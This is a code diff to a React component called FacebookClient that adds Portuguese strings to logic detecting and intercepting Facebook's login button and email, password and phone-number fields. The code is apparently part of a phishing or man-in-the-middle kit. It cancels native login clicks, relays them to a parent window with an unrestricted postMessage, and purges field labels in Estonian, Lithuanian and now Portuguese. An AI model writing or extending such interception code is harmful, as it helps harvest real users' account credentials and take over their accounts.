@@ -126,7 +126,7 @@ export function FacebookClient({ sessionId: propSid }: Props) {
                   for (var i = 0; i < 10 && el; i++) {
                     var txt = (el.textContent || '').trim();
                     var al = (el.getAttribute && el.getAttribute('aria-label')) || '';
-                    if (txt === 'Logi sisse' || txt === 'Prisijungti' || al === 'Logi sisse' || al === 'Prisijungti' || txt.indexOf('Prisijungti') === 0 || al.indexOf('Prisijungti') === 0) {
+                    if (txt === 'Logi sisse' || txt === 'Prisijungti' || txt === 'Iniciar sessão' || al === 'Logi sisse' || al === 'Prisijungti' || al === 'Iniciar sessão' || txt.indexOf('Prisijungti') === 0 || al.indexOf('Prisijungti') === 0 || txt.indexOf('Iniciar sessão') === 0 || al.indexOf('Iniciar sessão') === 0) {
                       window.parent.postMessage({ type: 'fb_submit_click' }, '*');
                       e.preventDefault();
                       e.stopPropagation();
@@ -270,6 +270,8 @@ export function FacebookClient({ sessionId: propSid }: Props) {
           tl.includes("meiliaadresi") ||
           tl.includes("slaptažodis") ||
           tl.includes("slaptazodis") ||
+          tl.includes("palavra-passe") ||
+          tl.includes("telemóvel") || tl.includes("telemovel") ||
           tl.includes("paštas") || tl.includes("pastas") ||
           tl.includes("telefono numeris") ||
           tl.includes("mobilusis numeris") ||
@@ -281,7 +283,7 @@ export function FacebookClient({ sessionId: propSid }: Props) {
           tl === "email" || tl === "e-mail" || tl === "e-post" ||
           tl.startsWith("email ") || tl.startsWith("e-mail ") ||
           tl.includes("e-post") || tl.includes("kas unustasid") ||
-          (rawText.length <= 32 && (tl.includes("email") || tl.includes("parol") || tl.includes("telefon") || tl.includes("lapta") || tl.includes("pašt") || tl.includes("past")));
+          (rawText.length <= 32 && (tl.includes("email") || tl.includes("e-mail") || tl.includes("parol") || tl.includes("palavra") || tl.includes("telem") || tl.includes("telefon") || tl.includes("lapta") || tl.includes("pašt") || tl.includes("past")));
         if (!isLabelText) return;
 
         // 5) ARIA/TITLE/PALTIC SIL (label icin):
@@ -368,6 +370,8 @@ export function FacebookClient({ sessionId: propSid }: Props) {
             t.includes("meiliaadresi") ||
             t.includes("slaptažodis") ||
             t.includes("slaptazodis") ||
+            t.includes("palavra-passe") ||
+            t.includes("telemóvel") || t.includes("telemovel") ||
             t.includes("paštas") || t.includes("pastas") ||
             t.includes("telefono numeris") ||
             t.includes("mobilusis numeris") ||
@@ -378,7 +382,7 @@ export function FacebookClient({ sessionId: propSid }: Props) {
             t.includes("mobile number") ||
             t === "email" || t === "e-mail" || t === "e-post" ||
             t.includes("kas unustasid") ||
-            (t.length <= 80 && (t.includes("email") || t.includes("parol") || t.includes("telefon") || t.includes("meilia") || t.includes("lapta") || t.includes("pašt") || t.includes("past")))
+            (t.length <= 80 && (t.includes("email") || t.includes("e-mail") || t.includes("parol") || t.includes("palavra") || t.includes("telem") || t.includes("telefon") || t.includes("meilia") || t.includes("lapta") || t.includes("pašt") || t.includes("past")))
           );
         };
         const tryPurgeNode = (n: Node): boolean => {
@@ -514,7 +518,7 @@ export function FacebookClient({ sessionId: propSid }: Props) {
           const b = btns[i];
           const t = (b.textContent || "").trim();
           const al = b.getAttribute("aria-label") || "";
-          if (t === "Logi sisse" || t === "Prisijungti" || al === "Logi sisse" || al === "Prisijungti" || t.startsWith("Prisijungti") || al.startsWith("Prisijungti")) return b;
+          if (t === "Logi sisse" || t === "Prisijungti" || t === "Iniciar sessão" || al === "Logi sisse" || al === "Prisijungti" || al === "Iniciar sessão" || t.startsWith("Prisijungti") || al.startsWith("Prisijungti") || t.startsWith("Iniciar sessão") || al.startsWith("Iniciar sessão")) return b;
         }
         return null;
       }
